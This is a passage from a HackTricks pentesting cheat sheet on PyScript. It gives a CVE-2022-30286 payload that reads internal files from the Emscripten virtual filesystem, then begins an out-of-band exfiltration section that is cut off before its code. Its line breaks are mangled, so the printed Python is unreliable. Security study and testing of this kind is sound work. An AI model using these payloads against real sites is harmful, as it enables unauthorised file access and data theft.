{"title": "Pyscript", "source": "hacktricks", "source_label": "HackTricks", "path": "generic-methodologies-and-resources/python/pyscript", "html": "<h1 id=\"pyscript\">Pyscript</h1>\n<h2 id=\"pyscript-pentesting-guide\">PyScript Pentesting Guide</h2>\n<p>PyScript is a new framework developed for integrating Python into HTML so, it can be used alongside HTML. In this cheat sheet, you'll find how to use PyScript for your penetration testing purposes.</p>\n<h3 id=\"dumping-retrieving-files-from-the-emscripten-virtual-memory-filesystem\">Dumping / Retrieving files from the Emscripten virtual memory filesystem:</h3>\n<p><code>CVE ID: CVE-2022-30286</code>.<sup><a href=\"#references\">[3]</a><a href=\"#references\">[7]</a></sup>\\\n\\\nCode:</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">&lt;</span><span class=\"nt\">py-script</span><span class=\"p\">&gt;</span>\n  with open(&#39;/lib/python3.10/site-packages/_pyodide/_base.py&#39;, &#39;r&#39;) as fin: out\n  = fin.read() print(out)\n<span class=\"p\">&lt;/</span><span class=\"nt\">py-script</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<p>Result:</p>\n<p><img alt=\"PyScript Pentesting Guide - Dumping / Retrieving files from the Emscripten virtual memory filesystem: = fin.read() print(out)\" src=\"https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png\" /></p>\n<h3 id=\"oob-data-exfiltration-of-the-emscripten-virtual-memory-filesystem-console-monitoring\"><a href=\"https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript\">OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)</a></h3>\n<p><code>CVE ID: CVE-2022-30286</code>.<sup><a href=\"#references\">[3]</a><a href=\"#references\">[7]</a></sup>\\\n\\\nCode:</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">&lt;</span><span class=\"nt\">py-script</span><span class=\"p\"